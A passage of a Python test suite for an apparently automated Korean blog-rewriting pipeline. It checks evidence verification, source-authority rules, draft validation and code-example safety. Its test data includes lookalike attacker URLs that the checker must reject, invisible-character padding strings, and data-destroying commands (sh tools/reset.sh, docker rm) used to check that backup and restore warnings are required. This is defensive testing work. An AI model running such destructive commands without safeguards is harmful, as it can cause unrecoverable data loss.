        subset_certificate = rewrite.certificate_for_strict_subset(
            locked,
            research,
            certificate,
        )
        self.assertEqual(
            [item["claim_id"] for item in subset_certificate["claim_checks"]],
            ["F1", "L1"],
        )
        for claim, item in zip(
            locked["facts"] + locked["limitations"],
            subset_certificate["claim_checks"],
        ):
            self.assertTrue(rewrite.strict_entailment_check_passes(item, claim))

    def test_research_accepts_complete_independently_verified_subset(self):
        post = next(rewrite.POSTS_DIR.glob("*.md")).resolve()
        documents = [{
            "url": "https://docs.example.org/guide",
            "title": "Guide",
            "publisher": "Example",
            "content_excerpt": "공식 문서 근거입니다. " * 100,
            "content_sha256": rewrite.sha256_text("공식 문서 근거입니다. " * 100),
            "outbound_urls": [],
        }]
        candidate = rewrite.clean_research({
            "keep_topic": True,
            "sources": [{
                "url": documents[0]["url"],
                "title": "Guide",
                "publisher": "Example",
                "tier": "official",
            }],
            "facts": [{
                "statement": "검증된 사실 문장은 공식 근거와 정확히 일치합니다",
                "source_urls": [documents[0]["url"]],
                "evidence_ids": ["S01Q001"],
            }],
            "limitations": [{
                "statement": "검증된 한계 문장은 공식 조건을 그대로 보존합니다",
                "source_urls": [documents[0]["url"]],
                "evidence_ids": ["S01Q001"],
            }],
        })
        certificate = {"source_checks": [], "claim_checks": []}
        with tempfile.TemporaryDirectory() as directory:
            state = rewrite.StateStore(Path(directory), [post])
            with (
                patch.object(rewrite, "obtain_discovery", return_value=documents),
                patch.object(rewrite, "generate_json", return_value=candidate),
                patch.object(
                    rewrite,
                    "prune_deterministically_invalid_claims",
                    return_value=candidate,
                ),
                patch.object(rewrite, "validate_research", return_value=[]),
                patch.object(
                    rewrite,
                    "verify_evidence_candidate",
                    return_value=(certificate, ["한 후보만 범위 초과"], True),
                ),
                patch.object(
                    rewrite,
                    "retain_strictly_verified_claims",
                    return_value=candidate,
                ),
                patch.object(
                    rewrite,
                    "certificate_for_strict_subset",
                    return_value=certificate,
                ),
                patch.object(
                    rewrite,
                    "validate_evidence_verification",
                    return_value=[],
                ),
            ):
                result = rewrite.obtain_research(
                    post,
                    {"title": "테스트"},
                    state,
                    attempts=1,
                    verify_links=False,
                )
            self.assertEqual(
                result["facts"][0]["statement"],
                candidate["facts"][0]["statement"],
            )
            self.assertEqual(state.record(post)["status"], "researched")
            self.assertTrue(state.record(post)["retained_strict_subset"])
            state.close()

    def test_research_coverage_gap_triggers_source_refresh_classification(self):
        self.assertTrue(rewrite.research_coverage_errors_require_source_refresh([
            "검증 사실은 8~16개 필요: 4개",
            "검증 한계는 1~8개 필요: 0개",
        ]))
        self.assertFalse(rewrite.research_coverage_errors_require_source_refresh([
            "제목 길이 부적합: 12자",
        ]))

    def test_reader_promises_cannot_outrun_verified_claim_coverage(self):
        research = {
            "reader_promise": "Activepieces와 Zapier의 비용을 비교하고 MCP 지원을 판단합니다",
            "recommended_angle": "셀프호스팅 선택 기준",
            "popular_questions": ["Zapier보다 저렴한가요?", "MCP를 지원하나요?"],
            "facts": [{"statement": "Activepieces는 Docker Compose로 실행됩니다"}],
            "limitations": [],
        }
        errors = rewrite.research_intent_coverage_errors(research)
        self.assertTrue(any("가격·비용" in error for error in errors))
        self.assertTrue(any("MCP" in error for error in errors))
        self.assertTrue(any("zapier" in error.casefold() for error in errors))

        research["facts"].extend([
            {"statement": "Zapier 비교 요금은 월 $25입니다"},
            {"statement": "Activepieces는 MCP 연동을 지원합니다"},
        ])
        self.assertEqual(rewrite.research_intent_coverage_errors(research), [])

        generic_english = {
            "reader_promise": "Unpaired Image Translation 원리를 이해합니다",
            "recommended_angle": "Paired data 없이 학습하는 가이드",
            "popular_questions": [],
            "facts": [{"statement": "쌍이 없는 이미지 변환 원리를 설명합니다"}],
            "limitations": [],
        }
        self.assertEqual(
            rewrite.research_intent_coverage_errors(generic_english),
            [],
        )

        korean_particle_not_price = {
            "reader_promise": "CycleGAN 원 논문의 핵심 공식을 이해합니다",
            "recommended_angle": "원 논문과 구현의 연결을 설명합니다",
            "popular_questions": [],
            "facts": [{"statement": "CycleGAN은 순환 일관성 손실을 사용합니다"}],
            "limitations": [],
        }
        self.assertFalse(
            any(
                "가격·비용" in error
                for error in rewrite.research_intent_coverage_errors(
                    korean_particle_not_price
                )
            )
        )

        incomplete_workflow = {
            "primary_keyword": "Activepieces",
            "reader_promise": (
                "Activepieces의 Worker와 Engine 구조 및 안전한 백업·복구 절차를 "
                "확인합니다"
            ),
            "recommended_angle": "Docker 업데이트 전에 데이터를 백업합니다",
            "popular_questions": [],
            "facts": [{"statement": "Activepieces는 Docker 이미지로 실행됩니다"}],
            "limitations": [],
        }
        errors = rewrite.research_intent_coverage_errors(incomplete_workflow)
        self.assertTrue(any("백업·복구" in error for error in errors))

        unrelated_mcp = {
            "primary_keyword": "Agent Zero",
            "reader_promise": "Agent Zero의 MCP 연동 구조를 확인합니다",
            "recommended_angle": "MCP 연결 방식을 설명합니다",
            "popular_questions": [],
            "facts": [
                {"statement": "Agent Zero는 Docker 환경을 제공합니다"},
                {"statement": "MCP는 외부 시스템 연결 표준입니다"},
            ],
            "limitations": [],
        }
        errors = rewrite.research_intent_coverage_errors(unrelated_mcp)
        self.assertTrue(any("MCP 연동" in error for error in errors))
        unrelated_mcp["facts"].append({
            "statement": "Agent Zero는 MCP 서버 연결을 지원합니다",
        })
        self.assertEqual(rewrite.research_intent_coverage_errors(unrelated_mcp), [])

    def test_official_authority_is_host_owned_and_shared_repositories_need_backlinks(self):
        self.assertFalse(
            rewrite.institutional_primary_host("https://agency.gov.attacker.com/spec")
        )
        self.assertIsNotNone(
            rewrite.deterministic_source_rejection_reason(
                "https://seo-farm.example/blog/spec"
            )
        )
        statement = "PyTorch는 공식 저장소에서 해당 구성 요소를 제공합니다"
        evidence = "PyTorch 공식 저장소는 해당 구성 요소와 코드를 제공합니다."
        documents = [{
            "url": "https://pytorch.org/get-started/locally",
            "outbound_urls": ["https://github.com/pytorch/pytorch"],
        }]
        self.assertIsNone(
            rewrite.official_claim_authority_reason(
                "https://github.com/pytorch/pytorch",
                statement,
                evidence,
                documents,
            )
        )
        self.assertIsNotNone(
            rewrite.official_claim_authority_reason(
                "https://github.com/attacker/pytorch",
                statement,
                evidence,
                documents,
            )
        )
        self.assertIsNone(
            rewrite.official_claim_authority_reason(
                "https://github.com/QwenLM/Qwen-Agent",
                "저장소에는 에이전트 구성 요소가 포함됩니다",
                "The repository contains agent components",
                [],
                "Qwen-Agent",
            )
        )
        for project, subject in [
            ("https://github.com/facebook/react", "React"),
            ("https://github.com/vercel/next.js", "Next.js"),
            ("https://github.com/langchain-ai/langchain", "LangChain"),
            ("https://github.com/run-llama/llama_index", "LlamaIndex"),
            ("https://github.com/Lightning-AI/pytorch-lightning", "PyTorch Lightning"),
        ]:
            self.assertTrue(
                rewrite.shared_project_matches_subject(project, subject),
                msg=project,
            )
        for project in [
            "https://github.com/attacker/openai-tools",
            "https://github.com/attacker/openai-core",
            "https://github.com/attacker/pytorch-guide",
            "https://github.com/attacker/react-utils",
        ]:
            self.assertFalse(
                rewrite.shared_project_matches_subject(project, project.split("/")[-1]),
                msg=project,
            )
        self.assertFalse(
            rewrite.shared_project_matches_subject(
                "https://huggingface.co/attacker/unrelated-model",
                "Hugging Face Transformers 모델 사용법",
            )
        )
        self.assertFalse(
            rewrite.shared_project_matches_subject(
                "https://huggingface.co/attacker/transformers",
                "Transformers 사용법",
            )
        )
        self.assertTrue(
            rewrite.shared_project_matches_subject(
                "https://huggingface.co/huggingface/transformers",
                "Transformers 사용법",
            )
        )
        self.assertIsNotNone(
            rewrite.official_claim_authority_reason(
                "https://ray.example.net/docs/spec",
                "배열은 메모리를 사용합니다",
                "array 메모리 설명입니다",
                [],
            )
        )

    def test_official_registry_rejects_brand_lookalikes_and_suffix_spoofs(self):
        accepted_cases = [
            (
                "https://platform.openai.com/docs/guides",
                "ChatGPT는 OpenAI 문서의 안내 범위에 포함됩니다",
                "OpenAI는 ChatGPT 관련 공식 안내를 제공합니다",
            ),
            (
                "https://support.apple.com/guide/iphone",
                "iPhone은 Apple 지원 문서의 안내 범위에 포함됩니다",
                "Apple은 iPhone 관련 공식 안내를 제공합니다",
            ),
            (
                "https://docs.oracle.com/en/java/",
                "Java는 Oracle 문서의 안내 범위에 포함됩니다",
                "Oracle은 Java 관련 공식 안내를 제공합니다",
            ),
            (
                "https://docs.docker.com/reference/compose-file/services/",
                "services 최상위 요소는 서비스 정의를 포함합니다",
                "services top-level element contains service definitions",
            ),
            (
                "https://platform.openai.com/docs/api-reference/responses",
                "응답 객체에는 출력 항목이 포함됩니다",
                "The response object contains output items",
            ),
            (
                "https://www.openacc.org/specification",
                "OpenACC는 가속기 프로그래밍 지시문을 정의합니다",
                "OpenACC defines directives for accelerator programming",
            ),
            (
                "https://github.com/KhronosGroup/SYCL-docs",
                "SYCL 문서는 호스트와 장치 프로그래밍 모델을 설명합니다",
                "SYCL docs describe the host and device programming model",
            ),
            (
                "https://slurm.schedmd.com/gres.html",
                "Slurm은 GPU 자원을 GRES로 관리합니다",
                "Slurm manages GPU resources through GRES",
            ),
        ]
        for url, statement, evidence in accepted_cases:
            self.assertIsNone(
                rewrite.official_claim_authority_reason(url, statement, evidence, [])
            )

        rejected_cases = [
            ("https://openai-official.com/docs", "OpenAI official", "OpenAI official"),
            ("https://pytorch-docs.com/guide", "PyTorch docs", "PyTorch docs"),
            ("https://openai.dev/docs", "OpenAI docs", "OpenAI docs"),
            ("https://openai-tools.dev/docs", "OpenAI tools", "OpenAI tools"),
            ("https://openai.com.evil.co.kr/docs", "OpenAI docs", "OpenAI docs"),
        ]
        for url, statement, evidence in rejected_cases:
            self.assertIsNotNone(
                rewrite.official_claim_authority_reason(url, statement, evidence, [])
            )

        community_cases = [
            "https://community.openai.com/t/example/1",
            "https://discussions.apple.com/thread/1",
            "https://support.google.com/accounts/thread/1",
        ]
        for url in community_cases:
            self.assertIsNotNone(rewrite.provenance_rejection_reason(url))
            self.assertIsNotNone(
                rewrite.official_claim_authority_reason(
                    url,
                    "제품 동작을 설명합니다",
                    "제품 동작을 설명하는 글입니다",
                    [],
                )
            )

        self.assertFalse(
            rewrite.institutional_primary_host(
                "https://people.stanford.edu/alice/blog/openai-pricing"
            )
        )
        self.assertTrue(
            rewrite.institutional_primary_host(
                "https://proceedings.neurips.cc/paper_files/paper/2025/hash/example.html"
            )
        )

    def test_unknown_official_root_requires_independent_reciprocal_link(self):
        project_root = "https://github.com/real-org/real-project"
        documents = [
            {
                "url": "https://docs.realproject.dev/guide",
                "outbound_urls": [project_root],
            },
            {
                "url": project_root,
                "outbound_urls": ["https://docs.realproject.dev/guide"],
            },
        ]
        self.assertTrue(
            rewrite.official_root_authorized(
                "https://api.realproject.dev/reference",
                documents,
            )
        )
        self.assertIsNone(
            rewrite.official_claim_authority_reason(
                "https://docs.realproject.dev/guide",
                "설정 파일은 지정된 필드를 포함합니다",
                "The configuration contains the specified field",
                documents,
            )
        )
        self.assertIsNone(
            rewrite.official_claim_authority_reason(
                project_root,
                "저장소는 지정된 구성 요소를 포함합니다",
                "The repository contains the specified component",
                documents,
            )
        )
        one_way = [dict(documents[0]), {**documents[1], "outbound_urls": []}]
        self.assertFalse(
            rewrite.official_root_authorized(
                "https://docs.realproject.dev/guide",
                one_way,
            )
        )

    def test_draft_validator_rejects_fake_experience_and_unknown_link(self):
        sources = [
            {"url": "https://docs.example.org/product/guide"},
            {"url": "https://news.example.net/product/report"},
        ]
        research = {
            "primary_keyword": "Example 제품",
            "sources": sources,
        }
        long_paragraph = " ".join([
            "Example 제품은 운영 환경을 먼저 확인해야 합니다.",
            "현재 예산 범위를 문서의 조건과 대조합니다.",
            "필요한 기능이 실제 범위에 들어가는지 살펴봅니다.",
            "팀이 감당할 설정 작업도 선택 기준에 포함합니다.",
            "도입 전에 되돌릴 방법을 따로 기록합니다.",
            "실행 담당자와 검토 담당자를 구분합니다.",
            "적용 대상은 작은 범위부터 정합니다.",
            "공식 자료에서 달라진 조건을 다시 확인합니다.",
            "비교 대상에는 같은 질문을 적용합니다.",
            "예외 조건은 결론과 떨어뜨리지 않습니다.",
            "실패했을 때 확인할 항목을 미리 정합니다.",
            "필요하지 않은 기능은 판단에서 제외합니다.",
            "최종 선택 이유는 조건별로 남깁니다.",
            "실제 적용 전에는 결과 확인 기준을 정합니다.",
        ])
        content = f"""결론부터 말하면, Example 제품은 현재 비용과 적용 조건이 맞을 때만 선택해야 합니다. 독자는 비용과 적용 조건을 바로 판단할 수 있습니다.

## 먼저 내릴 결론

{long_paragraph} 첫 번째 기준입니다. [공식 문서]({sources[0]['url']})

## 같은 기준으로 비교하기

{long_paragraph} 두 번째 비교 기준입니다. [원문 보도]({sources[1]['url']})

## 적용 순서

{long_paragraph} 세 번째 적용 순서입니다.

## 안 맞는 사람과 주의점

{long_paragraph} 네 번째 주의 조건입니다.
"""
        draft = {
            "title": "Example 제품 도입 전에 확인할 비용과 적용 조건",
            "description": "Example 제품을 도입하기 전에 비용과 적용 조건, 실패하기 쉬운 설정을 직접 원문 기준으로 비교해 선택 기준을 정리합니다.",
            "summary": "Example 제품은 모든 환경에 같은 답이 아니므로 현재 조건과 실제 선택 기준을 함께 봐야 합니다. 공식 자료를 기준으로 적용 순서와 비용, 도입 전에 확인할 위험까지 구체적으로 설명합니다. 비교 항목별 확인 기준과 적용 전 점검 순서도 함께 제시합니다.",
            "content": content,
            "tags": ["Example", "제품", "도입", "비용", "가이드"],
            "entities": ["Example"],
            "faq": [
                {"question": "누구에게 맞나요?", "answer": "조건이 맞는 팀에 적합합니다."},
                {"question": "비용은 얼마인가요?", "answer": "공식 문서에서 확인해야 합니다."},
                {"question": "주의점은 무엇인가요?", "answer": "적용 환경을 먼저 확인합니다."},
            ],
        }
        self.assertEqual(rewrite.validate_draft(draft, research, {"existing_local_media": []}), [])
        audit = rewrite.clean_audit({
            "final_supported": True,
            "final_reader_ready": True,
            "evidence_score": 9,
            "reader_score": 8,
            "removed_or_corrected": ["과장 표현 삭제"],
            "final_draft": draft,
        })
        self.assertEqual(
            rewrite.validate_audit(audit, research, {"existing_local_media": []}),
            [],
        )
        original_content = draft["content"]
        draft["content"] += '\n```json\n{"url":"https://your-instance.com/mcp"}\n```\n'
        errors = rewrite.validate_draft(draft, research, {"existing_local_media": []})
        self.assertTrue(any("본문·코드에 조사 팩 밖 URL" in error for error in errors))
        draft["content"] = original_content
        draft["content"] += "\n제가 직접 테스트해봤습니다. [추가 링크](https://bad.example/post)\n"
        errors = rewrite.validate_draft(draft, research, {"existing_local_media": []})
        self.assertTrue(any("직접 경험" in error for error in errors))
        self.assertTrue(any("조사 팩 밖" in error for error in errors))

    def test_verification_requires_exact_unit_coverage_and_support(self):
        unit_texts = [
            "첫 번째 기능은 공식 문서에 명시되어 있습니다.",
            "두 번째 설정은 별도의 옵션을 사용합니다.",
            "세 번째 동작은 특정 입력에서만 실행됩니다.",
            "네 번째 제한은 지원 범위를 확인해야 합니다.",
        ]
        research = {
            "facts": [
                {
                    "id": f"F{index}",
                    "statement": text_value,
                    "evidence_ids": [f"S01Q00{index}"],
                }
                for index, text_value in enumerate(unit_texts, 1)
            ],
            "limitations": [],
            "verified_evidence": {
                f"S01Q00{index}": {"text": text_value}
                for index, text_value in enumerate(unit_texts, 1)
            },
        }
        final_draft = {
            "title": unit_texts[0],
            "description": unit_texts[1],
            "summary": unit_texts[2],
            "content": unit_texts[3],
            "faq": [],
        }
        verification = rewrite.clean_verification({
            "approved": True,
            "reader_ready": True,
            "reader_issues": [],
            "unit_checks": [
                {
                    "unit_id": f"U{index:03d}",
                    "verdict": "supported",
                    "support_ids": [f"f{index}"],
                    "clause_coverage": "complete",
                    "scope": "match",
                    "modality": "match",
                    "conditions": "preserved",
                    "inference": "none",
                    "reason": "해당 F 근거와 원문 구간이 이 문장의 모든 사실 절을 직접 명시합니다.",
                }
                for index in range(1, 5)
            ],
        })
        self.assertEqual(
            rewrite.validate_verification(verification, research, final_draft),
            [],
        )

        missing = rewrite.clean_verification({
            "approved": True,
            "reader_ready": True,
            "reader_issues": [],
            "unit_checks": verification["unit_checks"][:-1],
        })
        errors = rewrite.validate_verification(missing, research, final_draft)
        self.assertTrue(any("unit 집합 불일치" in error for error in errors))

        verification["unit_checks"][3]["support_ids"] = ["X9"]
        errors = rewrite.validate_verification(verification, research, final_draft)
        self.assertTrue(any("유효하지 않음" in error for error in errors))

        verification["unit_checks"][3]["support_ids"] = []
        verification["unit_checks"][3]["verdict"] = "nonfactual"
        for field in ("clause_coverage", "scope", "modality", "conditions", "inference"):
            verification["unit_checks"][3][field] = "not_applicable"
        errors = rewrite.validate_verification(verification, research, final_draft)
        self.assertTrue(any("nonfactual" in error for error in errors))

        verification["unit_checks"][3]["verdict"] = "unsupported"
        errors = rewrite.validate_verification(verification, research, final_draft)
        self.assertTrue(any("unsupported" in error for error in errors))
        self.assertTrue(rewrite.verification_requires_draft_revision(verification))

    def test_verification_rejects_faq_that_only_reuses_body_evidence(self):
        research = {
            "primary_keyword": "Example 설치",
            "secondary_keywords": [],
            "facts": [{
                "id": "F1",
                "statement": "Example은 설정 파일로 기능을 활성화합니다",
                "evidence_ids": ["S01Q001"],
            }],
            "limitations": [],
            "verified_evidence": {
                "S01Q001": {"text": "Example enables the feature with a configuration file."},
            },
        }
        final_draft = {
            "title": "Example 설치 전에 확인할 항목",
            "description": "",
            "summary": "",
            "content": "Example은 설정 파일로 기능을 활성화합니다.",
            "faq": [{
                "question": "Example 기능은 어떻게 활성화하나요?",
                "answer": "Example은 설정 파일로 기능을 활성화합니다.",
            }],
        }
        checks = []
        for unit in rewrite.build_draft_units(final_draft):
            if unit["role"] == "title":
                checks.append({
                    "unit_id": unit["unit_id"], "verdict": "navigation", "support_ids": [],
                    "clause_coverage": "not_applicable", "scope": "not_applicable",
                    "modality": "not_applicable", "conditions": "not_applicable",
                    "inference": "not_applicable",
                    "reason": "외부 사실을 주장하지 않는 중립적인 설치 항목 제목입니다.",
                })
            else:
                checks.append({
                    "unit_id": unit["unit_id"], "verdict": "supported", "support_ids": ["F1"],
                    "clause_coverage": "complete", "scope": "match", "modality": "match",
                    "conditions": "preserved", "inference": "none",
                    "reason": "설정 파일을 통한 기능 활성화가 단일 직접 근거에 명시되어 있습니다.",
                })
        verification = rewrite.clean_verification({
            "approved": True,
            "reader_ready": True,
            "reader_issues": [],
            "unit_checks": checks,
        })
        errors = rewrite.validate_verification(verification, research, final_draft)
        self.assertTrue(any("FAQ 답변이 본문" in error for error in errors))
        pruned = rewrite.remove_body_redundant_faqs(final_draft, verification)
        self.assertEqual(pruned["faq"], [])

    def test_standalone_citation_is_bound_to_preceding_fact_unit(self):
        units = rewrite.build_draft_units({
            "title": "테스트 제목입니다",
            "description": "",
            "summary": "",
            "content": (
                "Slurm은 배치 스크립트를 제출받습니다.\n"
                "[공식 문서](https://slurm.schedmd.com/quickstart.html)"
            ),
            "faq": [],
        })
        content_units = [unit for unit in units if unit["field"] == "content"]
        self.assertEqual(len(content_units), 1)
        self.assertIn("Slurm은 배치 스크립트를 제출받습니다.", content_units[0]["text"])
        self.assertIn("[공식 문서]", content_units[0]["text"])

    def test_rejected_body_unit_is_deleted_without_rewriting_supported_sibling(self):
        supported = "CycleGAN은 쌍이 없는 두 도메인 사이의 매핑을 학습합니다."
        unsupported = "옵션을 확인하면 모든 실행 오류를 방지할 수 있습니다."
        draft = {
            "title": "CycleGAN 학습 옵션을 확인하는 기준",
            "description": "",
            "summary": "",
            "content": supported + " " + unsupported,
            "faq": [],
        }
        units = rewrite.build_draft_units(draft)
        checks = []
        rejected_id = ""
        for unit in units:
            verdict = "unsupported" if unit["text"] == unsupported else "supported"
            if verdict == "unsupported":
                rejected_id = unit["unit_id"]
            checks.append({
                "unit_id": unit["unit_id"],
                "verdict": verdict,
                "support_ids": [] if verdict == "unsupported" else ["F1"],
            })
        cleaned, handled, unhandled = rewrite.remove_rejected_body_units(
            draft,
            {"unit_checks": checks},
        )
        self.assertIn(rejected_id, handled)
        self.assertEqual(unhandled, set())
        self.assertIn(supported, cleaned["content"])
        self.assertNotIn(unsupported, cleaned["content"])

    def test_verification_unit_limit_is_enforced_without_truncating_checks(self):
        oversized = {
            "title": "검증 단위 상한을 확인하는 충분히 긴 테스트 제목",
            "description": "설명입니다. " * 20,
            "summary": "요약입니다. " * 20,
            "content": "\n".join(
                f"- 근거가 필요한 목록 항목 {index}입니다."
                for index in range(rewrite.MAX_FINAL_UNITS + 1)
            ),
            "tags": ["가", "나", "다", "라", "마"],
            "entities": [],
            "faq": [],
        }
        errors = rewrite.validate_draft(
            oversized,
            {"sources": [], "primary_keyword": "검증"},
            {"title": "이전 제목"},
        )
        self.assertTrue(any("원고 단위" in error for error in errors))

        raw_checks = [
            {
                "unit_id": f"U{index:03d}",
                "verdict": "unsupported",
                "support_ids": [],
                "clause_coverage": "none",
                "scope": "not_applicable",
                "modality": "not_applicable",
                "conditions": "not_applicable",
                "inference": "not_applicable",
                "reason": "근거가 없어 승인할 수 없는 문장 단위임을 확인했습니다.",
            }
            for index in range(1, 242)
        ]
        cleaned = rewrite.clean_verification({"approved": False, "unit_checks": raw_checks})
        self.assertEqual(len(cleaned["unit_checks"]), 241)

    def test_compact_article_floor_allows_dense_narrow_answers_without_padding(self):
        base_content = (
            "테스트 독자가 바로 판단할 수 있는 결론부터 설명합니다.\n\n"
            "## 테스트 선택 기준\n\n"
            "근거로 확인한 항목을 순서대로 점검합니다.\n\n"
            "## 테스트 적용 시 주의\n\n"
        )

        def draft_at_length(target):
            compact_base = rewrite.visible_compact_length(base_content)
            content = base_content + ("확인" * ((target - compact_base) // 2))
            if rewrite.visible_compact_length(content) < target:
                content += "항"
            return {
                "title": "테스트 선택 전에 확인할 실제 기준과 주의점",
                "description": "테스트 선택 전에 필요한 기준과 적용 조건을 직접 근거 범위에서 빠르게 확인하도록 정리한 설명입니다. 불필요한 분량은 더하지 않습니다.",
                "summary": "테스트 선택 기준을 먼저 확인합니다. 적용할 때 놓치기 쉬운 주의점도 함께 점검합니다. 근거 없는 설명은 제외합니다.",
                "content": content,
                "tags": ["테스트", "선택", "주의", "근거", "가이드"],
                "entities": ["테스트"],
                "faq": [],
            }

        accepted_errors = rewrite.validate_draft(
            draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS),
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        rejected_errors = rewrite.validate_draft(
            draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS - 1),
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertFalse(any("본문 길이 부적합" in error for error in accepted_errors))
        self.assertTrue(any("본문 길이 부적합" in error for error in rejected_errors))

        summary_boundary = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
        summary_boundary["summary"] = "요약" * (rewrite.MIN_COMPACT_SUMMARY_CHARS // 2)
        summary_errors = rewrite.validate_draft(
            summary_boundary,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertFalse(any("summary가 너무 짧음" in error for error in summary_errors))
        summary_boundary["summary"] = summary_boundary["summary"][:-1]
        summary_errors = rewrite.validate_draft(
            summary_boundary,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertTrue(any("summary가 너무 짧음" in error for error in summary_errors))

        for invisible in (
            "\u200b", "\u2060", "\u2065", "\u2800", "\ufeff", "\ufff0",
            "\U000e0080", "\U000e0fff", "&#8203;", "&#x200B;", "&ZeroWidthSpace;",
        ):
            padded = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
            padded["content"] = base_content + (
                invisible * rewrite.MIN_COMPACT_CONTENT_CHARS
            )
            padded["summary"] = invisible * rewrite.MIN_COMPACT_SUMMARY_CHARS
            padding_errors = rewrite.validate_draft(
                padded,
                {"sources": [], "primary_keyword": "테스트"},
                {},
            )
            self.assertTrue(
                any("보이지 않는 제어/패딩 문자" in error for error in padding_errors),
                padding_errors,
            )
            self.assertTrue(any("본문 길이 부적합" in error for error in padding_errors))
            self.assertTrue(any("summary가 너무 짧음" in error for error in padding_errors))

        markdown_padding = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
        markdown_padding["content"] = base_content + ("[](#x)" * 200)
        markdown_padding["summary"] = "[](#x)" * 20
        markdown_padding_errors = rewrite.validate_draft(
            markdown_padding,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertTrue(
            any("본문 길이 부적합" in error for error in markdown_padding_errors),
            markdown_padding_errors,
        )
        self.assertTrue(
            any("summary가 너무 짧음" in error for error in markdown_padding_errors),
            markdown_padding_errors,
        )

        table_padding = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
        table_padding["content"] = (
            base_content + "\n\n| 기준 |\n|" + ("-" * 1200) + "|\n| 값 |"
        )
        table_padding_errors = rewrite.validate_draft(
            table_padding,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertTrue(
            any("본문 길이 부적합" in error for error in table_padding_errors),
            table_padding_errors,
        )

        combining_padding = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
        combining_padding["content"] = base_content + "가" + ("\u0301" * 1200)
        combining_padding["summary"] = "가" + ("\u20dd" * 120)
        combining_errors = rewrite.validate_draft(
            combining_padding,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertTrue(any("본문 길이 부적합" in error for error in combining_errors))
        self.assertTrue(any("summary가 너무 짧음" in error for error in combining_errors))

        abbreviation_padding = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
        abbreviation_padding["content"] = (
            base_content + "\n\n*[테스트]: " + ("설명" * 600)
        )
        abbreviation_errors = rewrite.validate_draft(
            abbreviation_padding,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertTrue(any("본문 길이 부적합" in error for error in abbreviation_errors))
        self.assertTrue(any("Kramdown 약어 정의" in error for error in abbreviation_errors))

        faq_invisible = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
        faq_invisible["faq"] = [{
            "question": "주의 조건은 무엇인가요?",
            "answer": "\u202e주의 조건을 확인합니다.",
        }]
        faq_errors = rewrite.validate_draft(
            faq_invisible,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertTrue(
            any("faq[0].answer에 보이지 않는" in error for error in faq_errors),
            faq_errors,
        )

        method_draft = draft_at_length(rewrite.MIN_COMPACT_CONTENT_CHARS)
        method_draft["title"] = "CycleGAN PyTorch 학습 옵션 설정법"
        method_errors = rewrite.validate_draft(
            method_draft,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertTrue(any("방법형 제목" in error for error in method_errors))
        method_draft["content"] += "\n\n```bash\npython train.py\n```"
        method_errors = rewrite.validate_draft(
            method_draft,
            {"sources": [], "primary_keyword": "테스트"},
            {},
        )
        self.assertFalse(any("방법형 제목" in error for error in method_errors))

    def test_copy_paste_commands_reject_empty_values_and_unexplained_placeholders(self):
        content = """대상 노드의 이름으로 값을 바꿔 실행합니다.

```bash
scontrol update nodename=NODE_A state=power_up
```
"""
        self.assertEqual(rewrite.unsafe_code_example_errors(content), [])

        empty_value = """노드를 올립니다.

```bash
scontrol update nodename= nodename state=power_up
```
"""
        errors = rewrite.unsafe_code_example_errors(empty_value)
        self.assertTrue(any("빈 할당값" in error for error in errors))
        self.assertTrue(any("플레이스홀더" in error for error in errors))

        silent_placeholder = """컨테이너를 삭제합니다.

```bash
docker rm activepieces_container_name
```
"""
        self.assertTrue(any(
            "플레이스홀더" in error
            for error in rewrite.unsafe_code_example_errors(silent_placeholder)
        ))

    def test_destructive_workflow_requires_backup_loss_warning_and_recovery(self):
        unsafe_research = {
            "facts": [
                {"statement": "컨테이너 및 데이터를 삭제하기 위해 `sh tools/reset.sh` 명령을 실행한다."},
                {"statement": "`docker compose up`으로 서비스를 실행한다."},
            ],
            "limitations": [],
        }
        errors = rewrite.research_destructive_workflow_errors(unsafe_research)
        self.assertTrue(any("백업" in error for error in errors), errors)
        self.assertTrue(any("데이터 손실" in error for error in errors), errors)
        self.assertTrue(any("복원" in error for error in errors), errors)

        safe_research = {
            **unsafe_research,
            "limitations": [
                {"statement": "초기화 전에 백업 또는 스냅샷을 만들어야 한다."},
                {"statement": "초기화하면 모든 데이터가 영구 삭제되어 되돌릴 수 없다."},
                {"statement": "초기화 후에 스냅샷에서 데이터를 복원하고 서비스를 재생성한다."},
            ],
        }
        self.assertEqual(
            rewrite.research_destructive_workflow_errors(safe_research), []
        )

    def test_destructive_code_requires_reader_visible_safety_context(self):
        unsafe_content = """서비스를 초기화합니다.

```bash
sh tools/reset.sh
```
"""
        errors = rewrite.unsafe_code_example_errors(unsafe_content)
        self.assertTrue(any("백업" in error for error in errors), errors)
        self.assertTrue(any("데이터 손실" in error for error in errors), errors)
        self.assertTrue(any("복원" in error for error in errors), errors)

        safe_content = """먼저 백업 또는 스냅샷을 만듭니다. 이 명령은 모든 데이터를
영구 삭제하므로 되돌릴 수 없습니다.

```bash
sh tools/reset.sh
```

문제가 있으면 스냅샷에서 복원하고 서비스를 재생성합니다.
"""
        self.assertEqual(rewrite.unsafe_code_example_errors(safe_content), [])

    def test_destructive_safety_rejects_negation_and_wrong_order(self):
        negation_bypass = """백업 없이 실행하면 데이터 손실이 발생해 복구할 수 없습니다.

```bash
sh tools/reset.sh
```
"""
        errors = rewrite.unsafe_code_example_errors(negation_bypass)
        self.assertTrue(any("긍정형 백업" in error for error in errors), errors)
        self.assertTrue(any("긍정형 복원" in error for error in errors), errors)

        wrong_order = """스냅샷에서 복원하고 서비스를 재생성합니다.
모든 데이터가 영구 삭제되어 되돌릴 수 없습니다.

```bash
sh tools/reset.sh
```

